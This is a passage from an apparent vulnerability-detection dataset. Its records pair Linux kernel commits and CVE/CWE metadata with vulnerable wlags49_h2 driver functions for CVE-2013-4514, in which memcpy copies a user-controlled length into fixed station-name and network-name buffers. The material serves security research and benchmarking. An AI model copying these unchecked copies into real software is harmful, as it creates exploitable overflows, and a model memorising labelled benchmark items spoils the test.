a setsockopt system call, related to the do_ip_vs_set_ctl function.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-4588"}
{"idx": 936, "project": "linux", "commit_id": "b5e2f339865fb443107e5b10603e53bbc92dc054", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/b5e2f339865fb443107e5b10603e53bbc92dc054", "commit_message": "staging: wlags49_h2: buffer overflow setting station name\n\nWe need to check the length parameter before doing the memcpy().  I've\nactually changed it to strlcpy() as well so that it's NUL terminated.\n\nYou need CAP_NET_ADMIN to trigger these so it's not the end of the\nworld.\n\nReported-by: Nico Golde <nico@ngolde.de>\nReported-by: Fabian Yamaguchi <fabs@goesec.de>\nSigned-off-by: Dan Carpenter <dan.carpenter@oracle.com>\nCc: stable@kernel.org\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>", "target": 1, "func": "int wvlan_set_station_nickname(struct net_device *dev,\n\t\t      struct iw_request_info *info,\n\t\t      union iwreq_data *wrqu,\n\t\t      char *extra)\n {\n \tstruct wl_private *lp = wl_priv(dev);\n \tunsigned long flags;\n \tint         ret = 0;\n \t/*------------------------------------------------------------------------*/\n \n\n\tDBG_FUNC(\"wvlan_set_station_nickname\");\n\tDBG_ENTER(DbgInfo);\n\n \twl_lock(lp, &flags);\n \n \tmemset(lp->StationName, 0, sizeof(lp->StationName));\n\tmemcpy(lp->StationName, extra, wrqu->data.length);\n \n \t/* Commit the adapter parameters */\n \twl_apply(lp);\n\twl_unlock(lp, &flags);\n\n\tDBG_LEAVE(DbgInfo);\n\treturn ret;\n} /* wvlan_set_station_nickname */\n", "func_hash": 62431484736668092588406280640396277708, "file_name": "wl_priv.c", "file_hash": 140308459115906431610874421688851747022, "cwe": ["CWE-119"], "cve": "CVE-2013-4514", "cve_desc": "Multiple buffer overflows in drivers/staging/wlags49_h2/wl_priv.c in the Linux kernel before 3.12 allow local users to cause a denial of service or possibly have unspecified other impact by leveraging the CAP_NET_ADMIN capability and providing a long station-name string, related to the (1) wvlan_uil_put_info and (2) wvlan_set_station_nickname functions.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-4514"}
{"idx": 937, "project": "linux", "commit_id": "b5e2f339865fb443107e5b10603e53bbc92dc054", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/b5e2f339865fb443107e5b10603e53bbc92dc054", "commit_message": "staging: wlags49_h2: buffer overflow setting station name\n\nWe need to check the length parameter before doing the memcpy().  I've\nactually changed it to strlcpy() as well so that it's NUL terminated.\n\nYou need CAP_NET_ADMIN to trigger these so it's not the end of the\nworld.\n\nReported-by: Nico Golde <nico@ngolde.de>\nReported-by: Fabian Yamaguchi <fabs@goesec.de>\nSigned-off-by: Dan Carpenter <dan.carpenter@oracle.com>\nCc: stable@kernel.org\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>", "target": 1, "func": "int wvlan_uil_put_info(struct uilreq *urq, struct wl_private *lp)\n{\n\tint                     result = 0;\n \tltv_t                   *pLtv;\n \tbool_t                  ltvAllocated = FALSE;\n \tENCSTRCT                sEncryption;\n \n #ifdef USE_WDS\n \thcf_16                  hcfPort  = HCF_PORT_0;\n#endif  /* USE_WDS */\n\t/*------------------------------------------------------------------------*/\n\tDBG_FUNC(\"wvlan_uil_put_info\");\n\tDBG_ENTER(DbgInfo);\n\n\n\tif (urq->hcfCtx == &(lp->hcfCtx)) {\n\t\tif (capable(CAP_NET_ADMIN)) {\n\t\t\tif ((urq->data != NULL) && (urq->len != 0)) {\n\t\t\t\t/* Make sure that we have at least a command and length to send. */\n\t\t\t\tif (urq->len < (sizeof(hcf_16) * 2)) {\n\t\t\t\t\turq->len = sizeof(lp->ltvRecord);\n\t\t\t\t\turq->result = UIL_ERR_LEN;\n\t\t\t\t\tDBG_ERROR(DbgInfo, \"No Length/Type in LTV!!!\\n\");\n\t\t\t\t\tDBG_ERROR(DbgInfo, \"UIL_ERR_LEN\\n\");\n\t\t\t\t\tDBG_LEAVE(DbgInfo);\n\t\t\t\t\treturn result;\n\t\t\t\t}\n\n\t\t\t\t/* Verify the user buffer */\n\t\t\t\tresult = verify_area(VERIFY_READ, urq->data, urq->len);\n\t\t\t\tif (result != 0) {\n\t\t\t\t\turq->result = UIL_FAILURE;\n\t\t\t\t\tDBG_ERROR(DbgInfo, \"verify_area(), VERIFY_READ FAILED\\n\");\n\t\t\t\t\tDBG_LEAVE(DbgInfo);\n\t\t\t\t\treturn result;\n\t\t\t\t}\n\n\t\t\t\t/* Get only the command and length information. */\n\t\t\t\tcopy_from_user(&(lp->ltvRecord), urq->data, sizeof(hcf_16) * 2);\n\n\t\t\t\t/* Make sure the incoming LTV record length is within the bounds of the\n\t\t\t\t   IOCTL length */\n\t\t\t\tif (((lp->ltvRecord.len + 1) * sizeof(hcf_16)) > urq->len) {\n\t\t\t\t\turq->len = sizeof(lp->ltvRecord);\n\t\t\t\t\turq->result = UIL_ERR_LEN;\n\t\t\t\t\tDBG_ERROR(DbgInfo, \"UIL_ERR_LEN\\n\");\n\t\t\t\t\tDBG_LEAVE(DbgInfo);\n\t\t\t\t\treturn result;\n\t\t\t\t}\n\n\t\t\t\t/* If the requested length is greater than the size of our local\n\t\t\t\t   LTV record, try to allocate it from the kernel stack.\n\t\t\t\t   Otherwise, we just use our local LTV record. */\n\t\t\t\tif (urq->len > sizeof(lp->ltvRecord)) {\n\t\t\t\t\tpLtv = kmalloc(urq->len, GFP_KERNEL);\n\t\t\t\t\tif (pLtv != NULL) {\n\t\t\t\t\t\tltvAllocated = TRUE;\n\t\t\t\t\t} else {\n\t\t\t\t\t\tDBG_ERROR(DbgInfo, \"Alloc FAILED\\n\");\n\t\t\t\t\t\turq->len = sizeof(lp->ltvRecord);\n\t\t\t\t\t\turq->result = UIL_ERR_LEN;\n\t\t\t\t\t\tresult = -ENOMEM;\n\t\t\t\t\t\tDBG_LEAVE(DbgInfo);\n\t\t\t\t\t\treturn result;\n\t\t\t\t\t}\n\t\t\t\t} else {\n\t\t\t\t\tpLtv = &(lp->ltvRecord);\n\t\t\t\t}\n\n\t\t\t\t/* Copy the data from the user's buffer into the local LTV\n\t\t\t\t   record data area. */\n\t\t\t\tcopy_from_user(pLtv, urq->data, urq->len);\n\n\n\t\t\t\t/* We need to snoop the commands to see if there is anything we\n\t\t\t\t   need to store for the purposes of a reset or start/stop\n\t\t\t\t   sequence. Perform endian translation as needed */\n\t\t\t\tswitch (pLtv->typ) {\n\t\t\t\tcase CFG_CNF_PORT_TYPE:\n\t\t\t\t\tlp->PortType    = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]  = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_CNF_OWN_MAC_ADDR:\n\t\t\t\t\t/* TODO: determine if we are going to store anything based on this */\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_CNF_OWN_CHANNEL:\n\t\t\t\t\tlp->Channel     = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]  = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tbreak;\n\t\t\t\t/* CFG_CNF_OWN_SSID currently same as CNF_DESIRED_SSID. Do we\n\t\t\t\t   need separate storage for this? */\n\t\t\t\t/* case CFG_CNF_OWN_SSID: */\n\t\t\t\tcase CFG_CNF_OWN_ATIM_WINDOW:\n\t\t\t\t\tlp->atimWindow  = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]  = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_CNF_SYSTEM_SCALE:\n\t\t\t\t\tlp->DistanceBetweenAPs  = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]          = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\n\t\t\t\tcase CFG_CNF_MAX_DATA_LEN:\n\t\t\t\t\t/* TODO: determine if we are going to store anything based\n\t\t\t\t\t   on this */\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_CNF_PM_ENABLED:\n\t\t\t\t\tlp->PMEnabled   = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]  = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_CNF_MCAST_RX:\n\t\t\t\t\tlp->MulticastReceive    = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]          = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_CNF_MAX_SLEEP_DURATION:\n\t\t\t\t\tlp->MaxSleepDuration    = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]          = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_CNF_HOLDOVER_DURATION:\n\t\t\t\t\tlp->holdoverDuration    = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]          = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n \t\t\t\t\tbreak;\n \t\t\t\tcase CFG_CNF_OWN_NAME:\n \t\t\t\t\tmemset(lp->StationName, 0, sizeof(lp->StationName));\n\t\t\t\t\tmemcpy((void *)lp->StationName, (void *)&pLtv->u.u8[2], (size_t)pLtv->u.u16[0]);\n \t\t\t\t\tpLtv->u.u16[0] = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n \t\t\t\t\tbreak;\n \t\t\t\tcase CFG_CNF_LOAD_BALANCING:\n\t\t\t\t\tlp->loadBalancing       = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]          = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_CNF_MEDIUM_DISTRIBUTION:\n\t\t\t\t\tlp->mediumDistribution  = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]          = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tbreak;\n#ifdef WARP\n\t\t\t\tcase CFG_CNF_TX_POW_LVL:\n\t\t\t\t\tlp->txPowLevel          = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]          = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tbreak;\n\t\t\t\t/* case CFG_CNF_SHORT_RETRY_LIMIT: */ /* Short Retry Limit */\n\t\t\t\t/* case 0xFC33: */   /* Long Retry Limit */\n\t\t\t\tcase CFG_SUPPORTED_RATE_SET_CNTL:        /* Supported Rate Set Control */\n\t\t\t\t\tlp->srsc[0]             = pLtv->u.u16[0];\n\t\t\t\t\tlp->srsc[1]             = pLtv->u.u16[1];\n\t\t\t\t\tpLtv->u.u16[0]          = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tpLtv->u.u16[1]          = CNV_INT_TO_LITTLE(pLtv->u.u16[1]);\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_BASIC_RATE_SET_CNTL:        /* Basic Rate Set Control */\n\t\t\t\t\tlp->brsc[0]             = pLtv->u.u16[0];\n\t\t\t\t\tlp->brsc[1]             = pLtv->u.u16[1];\n\t\t\t\t\tpLtv->u.u16[0]          = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tpLtv->u.u16[1]          = CNV_INT_TO_LITTLE(pLtv->u.u16[1]);\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_CNF_CONNECTION_CNTL:\n\t\t\t\t\tlp->connectionControl   = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]          = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tbreak;\n\t\t\t\t/* case CFG_PROBE_DATA_RATE: */\n#endif  /* HERMES25 */\n\n#if 1 /* ;? (HCF_TYPE) & HCF_TYPE_AP */\n\t\t/* ;?should we restore this to allow smaller memory footprint */\n\n\t\t\t\tcase CFG_CNF_OWN_DTIM_PERIOD:\n\t\t\t\t\tlp->DTIMPeriod  = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]  = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tbreak;\n#ifdef WARP\n\t\t\t\tcase CFG_CNF_OWN_BEACON_INTERVAL:        /* Own Beacon Interval */\n\t\t\t\t\tlp->ownBeaconInterval   = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]          = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tbreak;\n#endif /* WARP */\n\t\t\t\tcase CFG_COEXISTENSE_BEHAVIOUR:         /* Coexistence behavior */\n\t\t\t\t\tlp->coexistence         = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]          = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tbreak;\n#ifdef USE_WDS\n\t\t\t\tcase CFG_CNF_WDS_ADDR1:\n\t\t\t\t\tmemcpy(&lp->wds_port[0].wdsAddress, &pLtv->u.u8[0], ETH_ALEN);\n\t\t\t\t\thcfPort = HCF_PORT_1;\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_CNF_WDS_ADDR2:\n\t\t\t\t\tmemcpy(&lp->wds_port[1].wdsAddress, &pLtv->u.u8[0], ETH_ALEN);\n\t\t\t\t\thcfPort = HCF_PORT_2;\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_CNF_WDS_ADDR3:\n\t\t\t\t\tmemcpy(&lp->wds_port[2].wdsAddress, &pLtv->u.u8[0], ETH_ALEN);\n\t\t\t\t\thcfPort = HCF_PORT_3;\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_CNF_WDS_ADDR4:\n\t\t\t\t\tmemcpy(&lp->wds_port[3].wdsAddress, &pLtv->u.u8[0], ETH_ALEN);\n\t\t\t\t\thcfPort = HCF_PORT_4;\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_CNF_WDS_ADDR5:\n\t\t\t\t\tmemcpy(&lp->wds_port[4].wdsAddress, &pLtv->u.u8[0], ETH_ALEN);\n\t\t\t\t\thcfPort = HCF_PORT_5;\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_CNF_WDS_ADDR6:\n\t\t\t\t\tmemcpy(&lp->wds_port[5].wdsAddress, &pLtv->u.u8[0], ETH_ALEN);\n\t\t\t\t\thcfPort = HCF_PORT_6;\n\t\t\t\t\tbreak;\n#endif  /* USE_WDS */\n\n\t\t\t\tcase CFG_CNF_MCAST_PM_BUF:\n\t\t\t\t\tlp->multicastPMBuffering    = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]              = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_CNF_REJECT_ANY:\n\t\t\t\t\tlp->RejectAny   = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]  = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tbreak;\n#endif\n\n\t\t\t\tcase CFG_CNF_ENCRYPTION:\n\t\t\t\t\tlp->EnableEncryption    = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]          = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_CNF_AUTHENTICATION:\n\t\t\t\t\tlp->authentication  = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]      = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tbreak;\n#if 1 /* ;? (HCF_TYPE) & HCF_TYPE_AP */\n\t\t/* ;?should we restore this to allow smaller memory footprint */\n\n\t\t\t\t/* case CFG_CNF_EXCL_UNENCRYPTED:\n\t\t\t\t\tlp->ExcludeUnencrypted  = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]          = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tbreak; */\n\t\t\t\tcase CFG_CNF_MCAST_RATE:\n\t\t\t\t\t/* TODO: determine if we are going to store anything based on this */\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_CNF_INTRA_BSS_RELAY:\n\t\t\t\t\tlp->intraBSSRelay   = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]      = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tbreak;\n#endif\n\n\t\t\t\tcase CFG_CNF_MICRO_WAVE:\n\t\t\t\t\t/* TODO: determine if we are going to store anything based on this */\n\t\t\t\t\tbreak;\n\t\t\t\t/*case CFG_CNF_LOAD_BALANCING:*/\n\t\t\t\t\t/* TODO: determine if we are going to store anything based on this */\n\t\t\t\t\t/* break; */\n\t\t\t\t/* case CFG_CNF_MEDIUM_DISTRIBUTION: */\n\t\t\t\t\t/* TODO: determine if we are going to store anything based on this */\n\t\t\t\t\t/* break; */\n\t\t\t\t/* case CFG_CNF_RX_ALL_GROUP_ADDRESS: */\n\t\t\t\t\t/*  TODO: determine if we are going to store anything based on this */\n\t\t\t\t\t/* break; */\n\t\t\t\t/* case CFG_CNF_COUNTRY_INFO: */\n\t\t\t\t\t/* TODO: determine if we are going to store anything based on this */\n\t\t\t\t\t/* break; */\n\t\t\t\tcase CFG_CNF_OWN_SSID:\n\t\t\t\t/* case CNF_DESIRED_SSID: */\n\t\t\t\tcase CFG_DESIRED_SSID:\n\t\t\t\t\tmemset(lp->NetworkName, 0, sizeof(lp->NetworkName));\n\t\t\t\t\tmemcpy((void *)lp->NetworkName, (void *)&pLtv->u.u8[2], (size_t)pLtv->u.u16[0]);\n\t\t\t\t\tpLtv->u.u16[0] = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\n\t\t\t\t\t/* take care of the special network name \"ANY\" case */\n\t\t\t\t\tif ((strlen(&pLtv->u.u8[2]) == 0) ||\n\t\t\t\t\t   (strcmp(&pLtv->u.u8[2], \"ANY\") == 0) ||\n\t\t\t\t\t   (strcmp(&pLtv->u.u8[2], \"any\") == 0)) {\n\t\t\t\t\t\t/* set the SSID_STRCT llen field (u16[0]) to zero, and the\n\t\t\t\t\t\teffectually null the string u8[2] */\n\t\t\t\t\t\tpLtv->u.u16[0] = 0;\n\t\t\t\t\t\tpLtv->u.u8[2]  = 0;\n\t\t\t\t\t}\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_GROUP_ADDR:\n\t\t\t\t\t/* TODO: determine if we are going to store anything based on this */\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_CREATE_IBSS:\n\t\t\t\t\tlp->CreateIBSS  = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]  = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_RTS_THRH:\n\t\t\t\t\tlp->RTSThreshold    = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]      = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_TX_RATE_CNTL:\n\t\t\t\t\tlp->TxRateControl[0]    = pLtv->u.u16[0];\n\t\t\t\t\tlp->TxRateControl[1]    = pLtv->u.u16[1];\n\t\t\t\t\tpLtv->u.u16[0]          = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tpLtv->u.u16[1]          = CNV_INT_TO_LITTLE(pLtv->u.u16[1]);\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_PROMISCUOUS_MODE:\n\t\t\t\t\t/* TODO: determine if we are going to store anything based on this */\n\t\t\t\t\tbreak;\n\t\t\t\t/* case CFG_WAKE_ON_LAN: */\n\t\t\t\t\t/* TODO: determine if we are going to store anything based on this */\n\t\t\t\t\t/* break; */\n#if 1 /* ;? #if (HCF_TYPE) & HCF_TYPE_AP */\n\t\t/* ;?should we restore this to allow smaller memory footprint */\n\t\t\t\tcase CFG_RTS_THRH0:\n\t\t\t\t\tlp->RTSThreshold    = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]      = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_TX_RATE_CNTL0:\n/*;?no idea what this should be, get going so comment it out\t\t\t\t\tlp->TxRateControl   = pLtv->u.u16[0];*/\n\t\t\t\t\tpLtv->u.u16[0]      = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tbreak;\n#ifdef USE_WDS\n\t\t\t\tcase CFG_RTS_THRH1:\n\t\t\t\t\tlp->wds_port[0].rtsThreshold    = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]                  = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\thcfPort                         = HCF_PORT_1;\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_RTS_THRH2:\n\t\t\t\t\tlp->wds_port[1].rtsThreshold    = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]                  = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\thcfPort                         = HCF_PORT_2;\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_RTS_THRH3:\n\t\t\t\t\tlp->wds_port[2].rtsThreshold    = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]                  = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\thcfPort                         = HCF_PORT_3;\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_RTS_THRH4:\n\t\t\t\t\tlp->wds_port[3].rtsThreshold    = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]                  = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\thcfPort                         = HCF_PORT_4;\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_RTS_THRH5:\n\t\t\t\t\tlp->wds_port[4].rtsThreshold    = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]                  = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\thcfPort                         = HCF_PORT_5;\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_RTS_THRH6:\n\t\t\t\t\tlp->wds_port[5].rtsThreshold    = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]                  = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\thcfPort                         = HCF_PORT_6;\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_TX_RATE_CNTL1:\n\t\t\t\t\tlp->wds_port[0].txRateCntl  = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]              = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\thcfPort                     = HCF_PORT_1;\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_TX_RATE_CNTL2:\n\t\t\t\t\tlp->wds_port[1].txRateCntl  = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]              = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\thcfPort                     = HCF_PORT_2;\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_TX_RATE_CNTL3:\n\t\t\t\t\tlp->wds_port[2].txRateCntl  = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]              = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\thcfPort                     = HCF_PORT_3;\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_TX_RATE_CNTL4:\n\t\t\t\t\tlp->wds_port[3].txRateCntl  = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]              = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\thcfPort                     = HCF_PORT_4;\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_TX_RATE_CNTL5:\n\t\t\t\t\tlp->wds_port[4].txRateCntl  = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]              = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\thcfPort                     = HCF_PORT_5;\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_TX_RATE_CNTL6:\n\t\t\t\t\tlp->wds_port[5].txRateCntl  = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]              = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\thcfPort                     = HCF_PORT_6;\n\t\t\t\t\tbreak;\n#endif  /* USE_WDS */\n#endif  /* (HCF_TYPE) & HCF_TYPE_AP */\n\n\t\t\t\tcase CFG_DEFAULT_KEYS:\n\t\t\t\t\t{\n\t\t\t\t\t\tCFG_DEFAULT_KEYS_STRCT *pKeys = (CFG_DEFAULT_KEYS_STRCT *)pLtv;\n\n\t\t\t\t\t\tpKeys->key[0].len = CNV_INT_TO_LITTLE(pKeys->key[0].len);\n\t\t\t\t\t\tpKeys->key[1].len = CNV_INT_TO_LITTLE(pKeys->key[1].len);\n\t\t\t\t\t\tpKeys->key[2].len = CNV_INT_TO_LITTLE(pKeys->key[2].len);\n\t\t\t\t\t\tpKeys->key[3].len = CNV_INT_TO_LITTLE(pKeys->key[3].len);\n\n\t\t\t\t\t\tmemcpy((void *)&(lp->DefaultKeys), (void *)pKeys,\n\t\t\t\t\t\t\t\tsizeof(CFG_DEFAULT_KEYS_STRCT));\n\t\t\t\t\t}\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_TX_KEY_ID:\n\t\t\t\t\tlp->TransmitKeyID   = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]      = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_SCAN_SSID:\n\t\t\t\t\t/* TODO: determine if we are going to store anything based on this */\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_TICK_TIME:\n\t\t\t\t\t/* TODO: determine if we are going to store anything based on this */\n\t\t\t\t\tbreak;\n\t\t\t\t/* these RIDS are Info RIDs, and should they be allowed for puts??? */\n\t\t\t\tcase CFG_MAX_LOAD_TIME:\n\t\t\t\tcase CFG_DL_BUF:\n\t\t\t\t/* case CFG_HSI_SUP_RANGE: */\n\t\t\t\tcase CFG_NIC_SERIAL_NUMBER:\n\t\t\t\tcase CFG_NIC_IDENTITY:\n\t\t\t\tcase CFG_NIC_MFI_SUP_RANGE:\n\t\t\t\tcase CFG_NIC_CFI_SUP_RANGE:\n\t\t\t\tcase CFG_NIC_TEMP_TYPE:\n\t\t\t\tcase CFG_NIC_PROFILE:\n\t\t\t\tcase CFG_FW_IDENTITY:\n\t\t\t\tcase CFG_FW_SUP_RANGE:\n\t\t\t\tcase CFG_MFI_ACT_RANGES_STA:\n\t\t\t\tcase CFG_CFI_ACT_RANGES_STA:\n\t\t\t\tcase CFG_PORT_STAT:\n\t\t\t\tcase CFG_CUR_SSID:\n\t\t\t\tcase CFG_CUR_BSSID:\n\t\t\t\tcase CFG_COMMS_QUALITY:\n\t\t\t\tcase CFG_CUR_TX_RATE:\n\t\t\t\tcase CFG_CUR_BEACON_INTERVAL:\n\t\t\t\tcase CFG_CUR_SCALE_THRH:\n\t\t\t\tcase CFG_PROTOCOL_RSP_TIME:\n\t\t\t\tcase CFG_CUR_SHORT_RETRY_LIMIT:\n\t\t\t\tcase CFG_CUR_LONG_RETRY_LIMIT:\n\t\t\t\tcase CFG_MAX_TX_LIFETIME:\n\t\t\t\tcase CFG_MAX_RX_LIFETIME:\n\t\t\t\tcase CFG_CF_POLLABLE:\n\t\t\t\tcase CFG_AUTHENTICATION_ALGORITHMS:\n\t\t\t\tcase CFG_PRIVACY_OPT_IMPLEMENTED:\n\t\t\t\t/* case CFG_CURRENT_REMOTE_RATES: */\n\t\t\t\t/* case CFG_CURRENT_USED_RATES: */\n\t\t\t\t/* case CFG_CURRENT_SYSTEM_SCALE: */\n\t\t\t\t/* case CFG_CURRENT_TX_RATE1: */\n\t\t\t\t/* case CFG_CURRENT_TX_RATE2: */\n\t\t\t\t/* case CFG_CURRENT_TX_RATE3: */\n\t\t\t\t/* case CFG_CURRENT_TX_RATE4: */\n\t\t\t\t/* case CFG_CURRENT_TX_RATE5: */\n\t\t\t\t/* case CFG_CURRENT_TX_RATE6: */\n\t\t\t\tcase CFG_NIC_MAC_ADDR:\n\t\t\t\tcase CFG_PCF_INFO:\n\t\t\t\t/* case CFG_CURRENT_COUNTRY_INFO: */\n\t\t\t\tcase CFG_PHY_TYPE:\n\t\t\t\tcase CFG_CUR_CHANNEL:\n\t\t\t\t/* case CFG_CURRENT_POWER_STATE: */\n\t\t\t\t/* case CFG_CCAMODE: */\n\t\t\t\tcase CFG_SUPPORTED_DATA_RATES:\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_AP_MODE:\n/*;?\t\t\t\tlp->DownloadFirmware = (pLtv->u.u16[0]) + 1; */\n\t\t\t\t\tDBG_ERROR(DbgInfo, \"set CFG_AP_MODE no longer supported\\n\");\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_ENCRYPT_STRING:\n\t\t\t\t\t/* TODO: ENDIAN TRANSLATION HERE??? */\n\t\t\t\t\tmemset(lp->szEncryption, 0, sizeof(lp->szEncryption));\n\t\t\t\t\tmemcpy((void *)lp->szEncryption,  (void *)&pLtv->u.u8[0],\n\t\t\t\t\t\t\t(pLtv->len * 